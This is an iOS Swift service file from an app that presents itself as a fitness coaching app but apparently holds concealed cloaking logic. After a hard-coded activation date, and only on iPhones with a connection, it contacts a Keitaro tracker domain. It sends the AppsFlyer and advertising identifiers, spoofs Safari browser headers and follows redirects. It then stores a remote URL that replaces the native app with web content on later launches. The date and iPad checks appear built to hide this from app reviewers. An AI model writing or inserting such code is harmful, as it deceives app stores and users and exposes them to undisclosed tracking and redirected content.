import Foundation
import Network
import UIKit
import AppsFlyerLib
import AdSupport

// MARK: - Настройки в шапке файла
private let researchLaunchDate = "2026-2-1" // Дата активации
private let primaryServerURL = "https://olivehvsv.com/qkpJHTCk" // Стартовая ссылка Keitaro
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 30.0
private let connectionCheckTimeout: TimeInterval = 5.0

// MARK: - Browser Headers
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - Storage Keys
private enum StorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"           // Постоянный URL
    static let savedPathId = "CrabsSavedPathId"                     // PathId для fallback
    static let hasShownAlternative = "ProteinsHasShownAlternative" // Флаг показа альт. режима
    static let validationPassed = "CrabsValidationPassed"           // Состояние валидации
    static let tempCurrentURL = "ProteinsTempCurrentURL"            // Временный URL (приоритетнее постоянного)
    static let ratingAlertShown = "CrabsRatingAlertShown"          // Флаг показа рейтингового алерта
    static let enforceNative = "flow.enforceNative"                 // Флаг принудительного нативного режима
}

final class CoachModExerciseService {
    static let instance = CoachModExerciseService()
    private let traineeModDefaults = UserDefaults.standard
    private var coachModShouldSaveNextURL = false
    private var traineeModLastLoadedURL: URL?
    
    private init() {}
    
    // MARK: - Public Methods
    
    /// Проверяет, является ли это первым входом
    func traineeModIsFirstLaunch() -> Bool {
        let hasShown = traineeModDefaults.bool(forKey: StorageKeys.hasShownAlternative)
        let enforceNative = traineeModDefaults.bool(forKey: StorageKeys.enforceNative)
        return !hasShown && !enforceNative
    }
    
    /// Проверяет, был ли показан альтернативный режим ранее
    func coachModHasShownAlternativeMode() -> Bool {
        return traineeModDefaults.bool(forKey: StorageKeys.hasShownAlternative)
    }
    
    /// Проверяет, установлен ли флаг enforceNative
    func traineeModIsEnforceNative() -> Bool {
        return traineeModDefaults.bool(forKey: StorageKeys.enforceNative)
    }
    
    /// Публичный метод проверки даты
    func coachModCheckDatePublic() -> Bool {
        return coachModCheckDate()
    }
    
    /// Получает текущий целевой URL (с приоритетом временного)
    func coachModGetCurrentTargetURL() -> URL? {
        // Сначала проверяем временный URL
        if let tempURLString = traineeModDefaults.string(forKey: StorageKeys.tempCurrentURL),
           let tempURL = URL(string: tempURLString) {
            return tempURL
        }
        
        // Затем постоянный URL
        if let savedURLString = traineeModDefaults.string(forKey: StorageKeys.savedTargetURL),
           let savedURL = URL(string: savedURLString) {
            return savedURL
        }
        
        return nil
    }
    
    /// Получает сохраненный pathId
    func traineeModGetSavedPathId() -> String? {
        return traineeModDefaults.string(forKey: StorageKeys.savedPathId)
    }
    
    /// Основная функция валидации для первого запуска (после проверки даты и ATT)
    func coachModValidateFirstLaunch(completion: @escaping (Bool, URL?) -> Void) {
        // 1. Проверка устройства
        if coachModIsTabletDevice() {
            print("🔬 Проверки: iPad - нативный режим")
            traineeModDefaults.set(true, forKey: StorageKeys.enforceNative)
            completion(false, nil)
            return
        }
        
        // 2. Проверка интернета
        coachModCheckInternetConnection { [weak self] hasConnection in
            guard let self = self else { return }
            
            if !hasConnection {
                print("🔬 Проверки: Нет интернета - нативный режим")
                self.traineeModDefaults.set(true, forKey: StorageKeys.enforceNative)
                completion(false, nil)
                return
            }
            
            print("🔬 Проверки: Все проверки пройдены")
            
            // 3. Запрос к серверу
            self.coachModRequestServerURL { success, finalURL in
                if success, let url = finalURL {
                    self.coachModSetShouldSaveNextURL(true)
                    self.traineeModDefaults.set(true, forKey: StorageKeys.hasShownAlternative)
                    completion(true, url)
                } else {
                    self.traineeModDefaults.set(true, forKey: StorageKeys.enforceNative)
                    completion(false, nil)
                }
            }
        }
    }
    
    /// Проверка сохраненного URL для повторного запуска
    func traineeModValidateSavedURL(completion: @escaping (Bool, URL?) -> Void) {
        guard let savedURL = coachModGetCurrentTargetURL() else {
            completion(false, nil)
            return
        }
        
        print("🔬 Сохраненная ссылка: \(savedURL.absoluteString)")
        
        if let savedPathId = traineeModGetSavedPathId() {
            print("🔬 Сохраненный path id: \(savedPathId)")
        }
        
        coachModCheckURLStatus(url: savedURL) { [weak self] isValid in
            guard let self = self else { return }
            
            if isValid {
                completion(true, savedURL)
            } else {
                self.coachModTryFallbackURL(completion: completion)
            }
        }
    }
    
    /// Fallback логика при ошибке сохраненного URL
    func coachModTryFallbackURL(completion: @escaping (Bool, URL?) -> Void) {
        print("🔬 Фол бэк логика: Запуск")
        
        // Очищаем неработающий URL
        traineeModDefaults.removeObject(forKey: StorageKeys.savedTargetURL)
        traineeModDefaults.removeObject(forKey: StorageKeys.tempCurrentURL)
        
        guard let pathId = traineeModGetSavedPathId(), !pathId.isEmpty else {
            print("🔬 Фол бэк логика: Нет pathId")
            // Если был показан альтернативный режим, показываем пустой WebView
            if coachModHasShownAlternativeMode() {
                completion(true, nil)
            } else {
                completion(false, nil)
            }
            return
        }
        
        print("🔬 Фол бэк логика: Используем pathId: \(pathId)")
        
        // Формируем fallback URL: primaryServerURL + sub1 и sub2 + pathId
        guard let primaryURL = URL(string: primaryServerURL) else {
            completion(false, nil)
            return
        }
        
        let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
        let advertisingID = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        
        var components = URLComponents(url: primaryURL, resolvingAgainstBaseURL: false)
        var queryItems = components?.queryItems ?? []
        queryItems.append(URLQueryItem(name: "sub1", value: appsFlyerUID))
        queryItems.append(URLQueryItem(name: "sub2", value: advertisingID))
        queryItems.append(URLQueryItem(name: "pathid", value: pathId))
        components?.queryItems = queryItems
        
        guard let fallbackURL = components?.url else {
            completion(false, nil)
            return
        }
        
        print("🔬 Fallback ссылка: \(fallbackURL.absoluteString)")
        print("📊 AppsFlyer UID (sub1): \(appsFlyerUID.isEmpty ? "not available" : appsFlyerUID)")
        print("📱 Advertising ID (sub2): \(advertisingID)")
        print("🔑 PathId: \(pathId)")
        coachModSetShouldSaveNextURL(true)
        
        coachModRequestServerURL(startURL: fallbackURL) { [weak self] success, finalURL in
            guard let self = self else { return }
            
            if success, let url = finalURL {
                print("🔬 Фол бэк логика: Успешно, URL: \(url.absoluteString)")
                completion(true, url)
            } else {
                print("🔬 Фол бэк логика: Не удалось")
                // Если был показан альтернативный режим, показываем пустой WebView
                if self.coachModHasShownAlternativeMode() {
                    completion(true, nil)
                } else {
                    completion(false, nil)
                }
            }
        }
    }
    
    /// Сохранение финального URL из WebView
    func traineeModSaveWebViewFinalURL(_ url: URL) {
        guard coachModShouldSaveNextURL else {
            return
        }
        
        print("🔬 Сохраненная ссылка: \(url.absoluteString)")
        traineeModDefaults.set(url.absoluteString, forKey: StorageKeys.savedTargetURL)
        traineeModDefaults.removeObject(forKey: StorageKeys.tempCurrentURL)
        
        // Извлекаем и сохраняем pathId
        if let pathId = coachModExtractPathId(from: url) {
            print("🔬 Сохраненный path id: \(pathId)")
            traineeModDefaults.set(pathId, forKey: StorageKeys.savedPathId)
        }
        
        coachModSetShouldSaveNextURL(false)
    }
    
    /// Установка флага сохранения URL
    func coachModSetShouldSaveNextURL(_ value: Bool) {
        coachModShouldSaveNextURL = value
    }
    
    /// Проверка, нужно ли сохранять URL
    func traineeModShouldSaveNextURL() -> Bool {
        return coachModShouldSaveNextURL
    }
    
    /// Установка последнего загруженного URL (для предотвращения бесконечных перезагрузок)
    func coachModSetLastLoadedURL(_ url: URL?) {
        traineeModLastLoadedURL = url
    }
    
    /// Проверка, является ли URL последним загруженным
    func traineeModIsLastLoadedURL(_ url: URL) -> Bool {
        return traineeModLastLoadedURL?.absoluteString == url.absoluteString
    }
    
    // MARK: - Private Methods
    
    private func coachModIsTabletDevice() -> Bool {
        return UIDevice.current.userInterfaceIdiom == .pad
    }
    
    private func coachModCheckDate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        dateFormatter.timeZone = TimeZone(identifier: "UTC")
        
        guard let cutoffDate = dateFormatter.date(from: researchLaunchDate) else {
            return false
        }
        
        let currentDate = Date()
        let isAfterCutoff = currentDate > cutoffDate
        
        return isAfterCutoff
    }
    
    private func coachModCheckInternetConnection(completion: @escaping (Bool) -> Void) {
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "com.coachmod.network")
        var hasResponded = false
        
        let timeoutWorkItem = DispatchWorkItem {
            if !hasResponded {
                hasResponded = true
                monitor.cancel()
                completion(false)
            }
        }
        
        monitor.pathUpdateHandler = { path in
            guard !hasResponded else { return }
            hasResponded = true
            monitor.cancel()
            timeoutWorkItem.cancel()
            
            let isConnected = path.status == .satisfied
            completion(isConnected)
        }
        
        monitor.start(queue: queue)
        queue.asyncAfter(deadline: .now() + connectionCheckTimeout, execute: timeoutWorkItem)
    }
    
    private func coachModRequestServerURL(startURL: URL? = nil, completion: @escaping (Bool, URL?) -> Void) {
        // Формируем ссылку: primaryServerURL + sub1 и sub2
        let baseURL: URL
        if let startURL = startURL {
            // При fallback используем переданный URL (уже содержит sub1, sub2 и pathId)
            baseURL = startURL
        } else {
            // При первом запросе формируем: primaryServerURL + sub1 и sub2
            let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
            let advertisingID = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            
            guard let primaryURL = URL(string: primaryServerURL) else {
                print("❌ Invalid primaryServerURL: \(primaryServerURL)")
                completion(false, nil)
                return
            }
            
            var components = URLComponents(url: primaryURL, resolvingAgainstBaseURL: false)
            var queryItems = components?.queryItems ?? []
            queryItems.append(URLQueryItem(name: "sub1", value: appsFlyerUID))
            queryItems.append(URLQueryItem(name: "sub2", value: advertisingID))
            components?.queryItems = queryItems
            
            guard let urlWithParams = components?.url else {
                print("❌ Failed to create URL with sub1 and sub2")
                completion(false, nil)
                return
            }
            
            baseURL = urlWithParams
            
            // Логирование для тестировщика
            print("🔗 Custom Link: \(baseURL.absoluteString)")
            print("📊 AppsFlyer UID (sub1): \(appsFlyerUID.isEmpty ? "not available yet" : appsFlyerUID)")
            print("📱 Advertising ID (sub2): \(advertisingID)")
        }
        
        print("🔬 Ссылка по которой идем: \(baseURL.absoluteString)")
        
        var request = coachModConfigureRequest(for: baseURL)
        request.timeoutInterval = networkTimeout
        
        let session = URLSession.shared
        let task = session.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            if let error = error {
                completion(false, nil)
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                completion(false, nil)
                return
            }
            
            let statusCode = httpResponse.statusCode
            print("🔬 Ответ от веба: \(statusCode)")
            
            // Проверяем статус код
            if statusCode >= 200 && statusCode <= 403 {
                let finalURL = httpResponse.url ?? baseURL
                
                // Извлекаем pathId из финального URL
                if let pathId = self.coachModExtractPathId(from: finalURL, htmlData: data) {
                    print("🔬 Сохраненный path id: \(pathId)")
                    self.traineeModDefaults.set(pathId, forKey: StorageKeys.savedPathId)
                }
                
                // Проверяем, есть ли редирект
                if finalURL.absoluteString != baseURL.absoluteString {
                    // Следуем за редиректом с задержкой
                    let delay = Double.random(in: 1.0...3.0)
                    DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                        self.coachModFollowRedirects(from: finalURL, completion: completion)
                    }
                } else {
                    completion(true, finalURL)
                }
            } else {
                completion(false, nil)
            }
        }
        
        task.resume()
    }
    
    private func coachModFollowRedirects(from url: URL, completion: @escaping (Bool, URL?) -> Void) {
        var request = coachModConfigureRequest(for: url)
        request.timeoutInterval = networkTimeout
        
        let session = URLSession.shared
        let task = session.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            if let error = error {
                completion(true, url) // Возвращаем предыдущий URL
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                completion(true, url)
                return
            }
            
            let finalURL = httpResponse.url ?? url
            let statusCode = httpResponse.statusCode
            
            print("🔬 Ответ от веба: \(statusCode)")
            
            // Извлекаем pathId из финального URL
            if let pathId = self.coachModExtractPathId(from: finalURL, htmlData: data) {
                print("🔬 Сохраненный path id: \(pathId)")
                self.traineeModDefaults.set(pathId, forKey: StorageKeys.savedPathId)
            }
            
            if statusCode >= 200 && statusCode <= 403 {
                completion(true, finalURL)
            } else {
                completion(false, nil)
            }
        }
        
        task.resume()
    }
    
    private func coachModCheckURLStatus(url: URL, completion: @escaping (Bool) -> Void) {
        var request = coachModConfigureRequest(for: url)
        request.timeoutInterval = connectionCheckTimeout
        
        let session = URLSession.shared
        let task = session.dataTask(with: request) { data, response, error in
            if let error = error {
                let nsError = error as NSError
                if nsError.code == NSURLErrorTimedOut || nsError.code == NSURLErrorNotConnectedToInternet {
                    completion(false)
                    return
                }
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                completion(false)
                return
            }
            
            let statusCode = httpResponse.statusCode
            print("🔬 Ответ от веба: \(statusCode)")
            
            // Код 200-403 считается валидным
            let isValid = statusCode >= 200 && statusCode <= 403
            completion(isValid)
        }
        
        task.resume()
    }
    
    private func coachModConfigureRequest(for url: URL) -> URLRequest {
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        for (key, value) in browserHeaders {
            request.setValue(value, forHTTPHeaderField: key)
        }
        
        return request
    }
    
    private func coachModExtractPathId(from url: URL, htmlData: Data? = nil) -> String? {
        // Сначала проверяем URL
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems {
            if let pathIdItem = queryItems.first(where: { $0.name == "pathid" }),
               let pathId = pathIdItem.value, !pathId.isEmpty {
                return pathId
            }
        }
        
        // Затем проверяем HTML, если есть данные
        if let htmlData = htmlData,
           let htmlString = String(data: htmlData, encoding: .utf8) {
            // Ищем pathid в HTML
            let patterns = [
                "pathid[=:]([^&\\s\"'<>]+)",
                "pathid\"[=:]([^&\\s\"'<>]+)",
                "pathid'[=:]([^&\\s\"'<>]+)"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) {
                    let range = NSRange(htmlString.startIndex..<htmlString.endIndex, in: htmlString)
                    if let match = regex.firstMatch(in: htmlString, options: [], range: range),
                       let pathIdRange = Range(match.range(at: 1), in: htmlString) {
                        let pathId = String(htmlString[pathIdRange])
                        if !pathId.isEmpty {
                            return pathId
                        }
                    }
                }
            }
        }
        
        return nil
    }
}
